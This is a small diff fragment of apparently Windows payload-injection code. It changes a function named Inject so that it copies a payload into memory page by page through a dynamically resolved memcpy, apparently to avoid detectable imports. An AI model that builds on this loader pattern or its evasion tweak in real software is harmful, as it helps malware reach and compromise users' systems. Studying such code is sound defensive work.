@@ -50,7 +50,7 @@ BOOL Inject(PBYTE* pInjectedPayload)
 
     for (DWORD i = 0; i < ii; i++)
     {
-        memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);
+        apis.msvcrt.memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);
 
         pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
         pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
